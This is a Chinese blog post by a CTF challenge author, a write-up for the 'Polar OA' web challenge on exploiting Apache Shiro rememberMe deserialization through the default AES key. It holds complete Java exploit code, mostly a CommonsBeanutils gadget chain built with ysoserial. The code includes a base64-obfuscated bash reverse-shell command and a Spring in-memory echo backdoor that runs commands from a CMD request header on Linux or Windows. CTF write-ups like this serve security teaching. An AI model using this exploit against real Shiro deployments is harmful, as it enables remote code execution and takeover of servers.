---
title: 记一次CTF出题之PolarOA_WP篇
date: 2023-09-28 18:53:00 +0800
img_path: /
categories: [CTF, CTF出题记录]
tags: [CTF, CTF出题记录]   
---

# WEB-Polar OA

## 一、查看题目信息

题目给出一个`PolarOA`统一身份认证系统的登录界面。

![image-20230927204637166](assets/image-20230927204637166.png)

## 二、题目分析

在登录界面尝试登录并抓包查看信息，发现`rememberMe`的特征字符串，可猜测考察`shiro`反序列化的利用。

![image-20230927205250118](assets/image-20230927205250118.png)

原理：Apache Shiro框架的记住密码功能，用户登录后生成加密编码的cookie。服务端对记住密码产生的cookie进行base64解密，再进行AES解密，之后进行反序列化，导致了反序列化漏洞。

 服务端过程：`cookie`-->`base64解密`-->`AES解密`-->`反序列化`

针对`shiro`的特征，首先尝试爆破`shiro` 的`AES`加密使用的`key`

![image-20230927205801748](assets/image-20230927205801748.png)

拿到`key`：`kPH+bIxk5D2deZiIxcaaaA==`后发现是`shiro 1.2.4`默认的`key`，接下来尝试爆破利用链：

![image-20230927205942899](assets/image-20230927205942899.png)

爆破所有利用链发现，没有可利用的链（其实不是，没有爆破出来是因为对Cookie长度做了限制，可测试出传入Cookie的字符串需要小于大约3500个字符），在我们使用`maven`自行在`pom.xml`添加`shiro`环境时会发现`commons-beanutils`赫然在列。也就是说，`Shiro`是依赖于`commons-beanutils`的。

![image-20230927210437484](assets/image-20230927210437484.png)

接下来就可以构造无依赖的Shiro反序列化利用链，我们使用开源的`ysoserial`项目来生成我们的`payload`

首先`ysoserial`是没有`shiro`的依赖的，我们首先在项目中添加`shiro`的依赖，方便后面加密序列化的内容。

![image-20230927210844261](assets/image-20230927210844261.png)

其次`ysoserial`项目中使用的`commons-beanutils`是`1.9.2`的，我们同样需要更改`commons-beanutils`的版本为`1.8.3`否则会报`serialVersionUID`异常。

![image-20230928083558164](assets/image-20230928083558164.png)

### 1、出网利用方式

利用不依赖CC链的CB链POC

```java
package ysoserial.shiropoc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import ysoserial.poc.MyExec;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;


import static ysoserial.payloads.util.Reflections.setFieldValue;

//shiro无依赖利用链，使用shiro1.2.4自带的cb 1.8.3
public class POC {


    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = getTemplate();

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(queue);
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));//shiro默认密钥
        byte[] bytes = byteArrayOutputStream.toByteArray();

        ByteSource ciphertext;
        ciphertext = aes.encrypt(bytes, key);
        System.out.println(ciphertext);
    }
    public static TemplatesImpl getTemplate() throws Exception {

        ClassPool classPool = ClassPool.getDefault();
        CtClass clz = classPool.get(MyExec.class.getName());

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clz.toBytecode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        return obj;
    }

}
```

`MyExec`类如下：

```java
package ysoserial.poc;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class MyExec extends AbstractTranslet {

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    static {
        try {
            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2MDcMC85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}");
           //Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

```

### 2、不出网利用方式

上文说到利用条件需要传入Cookie的字符串需要小于大约3500个字符，可使用下方方式：

首先`DynamicClassGenerator`用来生成恶意`class`，针对不同系统使用不同的方法即可。

```java
package ysoserial.shiropoc;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtNewConstructor;
import javassist.NotFoundException;

import java.io.IOException;

public class DynamicClassGenerator {
    public CtClass genPayloadForWin() throws NotFoundException, CannotCompileException, IOException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.makeClass("Exp");

        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public SpringEcho() throws Exception {\n" +
            "            try {\n" +
            "                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
            "                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n" +
            "                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n" +
            "\n" +
            "                String te = httprequest.getHeader(\"Host\");\n" +
            "                httpresponse.addHeader(\"Host\", te);\n" +
            "                String tc = httprequest.getHeader(\"CMD\");\n" +
            "                if (tc != null && !tc.isEmpty()) {\n" +
            "                    String[] cmd = new String[]{\"cmd.exe\", \"/c\", tc};  \n" +
            "                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
            "                    httpresponse.getWriter().write(new String(result));\n" +
            "\n" +
            "                }\n" +
            "                httpresponse.getWriter().flush();\n" +
            "                httpresponse.getWriter().close();\n" +
            "            } catch (Exception e) {\n" +
            "                e.getStackTrace();\n" +
            "            }\n" +
            "        }", clazz));

        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        CtClass superClass = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        return clazz;
    }
    public CtClass genPayloadForLinux() throws NotFoundException, CannotCompileException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.makeClass("Exp");

        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public SpringEcho() throws Exception {\n" +
            "            try {\n" +
            "                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
            "                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n" +
            "                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n" +
            "\n" +
            "                String te = httprequest.getHeader(\"Host\");\n" +
            "                httpresponse.addHeader(\"Host\", te);\n" +
            "                String tc = httprequest.getHeader(\"CMD\");\n" +
            "                if (tc != null && !tc.isEmpty()) {\n" +
            "                    String[] cmd =  new String[]{\"/bin/sh\", \"-c\", tc};\n" +
            "                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
            "                    httpresponse.getWriter().write(new String(result));\n" +
            "\n" +
            "                }\n" +
            "                httpresponse.getWriter().flush();\n" +
            "                httpresponse.getWriter().close();\n" +
            "            } catch (Exception e) {\n" +
            "                e.getStackTrace();\n" +
            "            }\n" +
            "        }", clazz));

        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        CtClass superClass = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        return clazz;
    }
}

```

使用`POC`加载恶意类并生成`payload`，根据上方的恶意类可看出命令的获取是从请求包中的`CMD`字段获取的。

```java
package ysoserial.shiropoc;



import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;


import static ysoserial.payloads.util.Reflections.setFieldValue;

//shiro无依赖利用链，使用shiro1.2.4自带的cb 1.8.3
public class POC {
    public static void main(String[] args) throws Exception {
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate();

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(queue);
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));//shiro默认密钥
        byte[] bytes = byteArrayOutputStream.toByteArray();

        ByteSource ciphertext;
        ciphertext = aes.encrypt(bytes, key);
        System.out.println(ciphertext);
    }
    public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception {
        DynamicClassGenerator classGenerator =new DynamicClassGenerator();
        CtClass clz = classGenerator.genPayloadForLinux();
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clz.toBytecode()});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        return obj;
    }
}
```



## 三、漏洞利用

### 1、出网利用

攻击机监听端口：

![image-20230927211736168](assets/image-20230927211736168.png)

更改`MyExec`类中的 `Runtime.getRuntime().exec()`函数为反弹shell命令并运行；

![image-20230927211503781](assets/image-20230927211503781.png)

抓包修改`Cookie`为生成的`payload`并发包。

![image-20230927212002177](assets/image-20230927212002177.png)

攻击机接收到shell：

![image-20230927212101155](assets/image-20230927212101155.png)

### 2、不出网利用

运行`POC`生成`payload`

![image-20240124194013015](assets/image-20240124194013015.png)

抓包修改`Cookie`为生成的`payload`同时添加请求包的`CMD`字段的内容并发包。

![image-20240124193920319](assets/image-20240124193920319.png)